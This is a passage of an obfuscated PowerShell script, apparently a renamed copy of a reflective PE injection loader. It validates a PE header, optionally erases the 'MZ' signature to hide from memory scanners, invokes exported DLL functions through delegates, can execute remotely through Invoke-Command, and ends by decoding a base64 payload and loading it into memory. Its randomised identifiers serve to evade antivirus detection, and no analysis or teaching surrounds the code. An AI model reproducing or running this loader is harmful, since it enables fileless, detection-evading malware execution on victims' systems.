                    $UNWzPtYZ99 = gentler @() ([IntPtr])
                    $JmhvKgNd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ejtRvCAf99, $UNWzPtYZ99)
                    [IntPtr]$XjDxfNPX99 = $JmhvKgNd99.Invoke()
                    $dvtPMuSw99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($XjDxfNPX99)
                    Write-Output $dvtPMuSw99
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$vFmpZaXM99 = greasiness -nrZUEnxp99 $nrZUEnxp99 -FunctionName "StringFunc"
                    if ($vFmpZaXM99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $GhfWLOhw99 = gentler @() ([IntPtr])
                    $XjwGLNkw99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vFmpZaXM99, $GhfWLOhw99)
                    [IntPtr]$XjDxfNPX99 = $XjwGLNkw99.Invoke()
                    $dvtPMuSw99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($XjDxfNPX99)
                    Write-Output $dvtPMuSw99
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$hJdBnzNG99 = greasiness -nrZUEnxp99 $nrZUEnxp99 -FunctionName "VoidFunc"
                    if ($hJdBnzNG99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $DiFAoCxD99 = gentler @() ([Void])
                    $pQPvrUzF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($hJdBnzNG99, $DiFAoCxD99)
                    $pQPvrUzF99.Invoke() | Out-Null
                }
            }
        }
        elseif (($PEInfo.FileType -ieq "DLL") -and ($hTcxIZqi99 -ne [IntPtr]::Zero))
        {
            $hJdBnzNG99 = greasiness -nrZUEnxp99 $nrZUEnxp99 -FunctionName "VoidFunc"
            if (($hJdBnzNG99 -eq $null) -or ($hJdBnzNG99 -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $hJdBnzNG99 = smartphone $hJdBnzNG99 $nrZUEnxp99
            $hJdBnzNG99 = elastic $hJdBnzNG99 $QQCKOyFu99

            $Null = virtual -TUzdqtBB99 $hTcxIZqi99 -StartAddress $hJdBnzNG99 -YokgFkKj99 $YokgFkKj99
        }

        if ($hTcxIZqi99 -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Z -nrZUEnxp99 $nrZUEnxp99
        }
        else
        {
            $BjJZNTzC99 = $YokgFkKj99.VirtualFree.Invoke($nrZUEnxp99, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($BjJZNTzC99 -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $KkGZPQLX99  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    $iBvndXUz99 = ($CVDncjuZ99[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($iBvndXUz99 -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $TaqPgsYR99) {
        $CVDncjuZ99[0] = 0
        $CVDncjuZ99[1] = 0
    }

    if ($fjeCFrVH99 -ne $null -and $fjeCFrVH99 -ne '')
    {
        $fjeCFrVH99 = "ReflectiveExe $fjeCFrVH99"
    }
    else
    {
        $fjeCFrVH99 = "ReflectiveExe"
    }

    if ($rQSYDZED99 -eq $null -or $rQSYDZED99 -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $CXaaxouO99 -ArgumentList @($CVDncjuZ99, $KvjRRenh99, $exsasvkm99, $VlMSmfKv99,$ueHcUoLs99)
    }
    else
    {
        Invoke-Command -ScriptBlock $CXaaxouO99 -ArgumentList @($CVDncjuZ99, $KvjRRenh99, $exsasvkm99, $VlMSmfKv99,$ueHcUoLs99) -rQSYDZED99 $rQSYDZED99
    }
}

Main
}

 
$CVDncjuZ99 = [System.Convert]::FromBase64String($dvmnMITO99)
Rusty -CVDncjuZ99 $CVDncjuZ99 -fjeCFrVH99 $arguments
